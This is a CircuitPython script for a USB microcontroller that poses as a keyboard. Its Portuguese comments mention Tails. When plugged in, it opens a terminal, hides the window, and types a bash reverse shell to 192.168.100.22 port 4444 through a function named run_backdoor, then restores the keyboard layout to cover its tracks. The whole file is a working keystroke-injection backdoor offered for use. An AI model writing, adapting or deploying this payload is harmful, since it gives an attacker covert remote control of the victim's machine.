import time
import board
import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# --- Configuração ---
WAIT_TIME = 10  # Tempo para o Tails inicializar totalmente
TARGET_IP = "192.168.100.22"
TARGET_PORT = "4444"

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

try:
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
    time.sleep(1)
except Exception:
    while True:
        led.value = not led.value
        time.sleep(0.1)

def run_backdoor():
    # 1. Abre o terminal
    kbd.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
    kbd.release_all()
    time.sleep(2)

    # 2. Minimiza a janela do terminal com Super + H
    kbd.press(Keycode.GUI, Keycode.H)
    kbd.release_all()
    time.sleep(1)

    # 3. Muda layout para US
    layout.write("setxkbmap us")
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(1)

    # 4. Executa shell reverso
    cmd = f"bash -i >& /dev/tcp/{TARGET_IP}/{TARGET_PORT} 0>&1"
    layout.write(cmd)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(2)
    
    kbd.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
    kbd.release_all()
    time.sleep(2)

    # 5. Volta para layout BR
    layout.write("setxkbmap br")
    kbd.press(Keycode.ENTER)
    kbd.release_all()

def main():
    led.value = True
    time.sleep(WAIT_TIME)
    run_backdoor()
    led.value = False
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
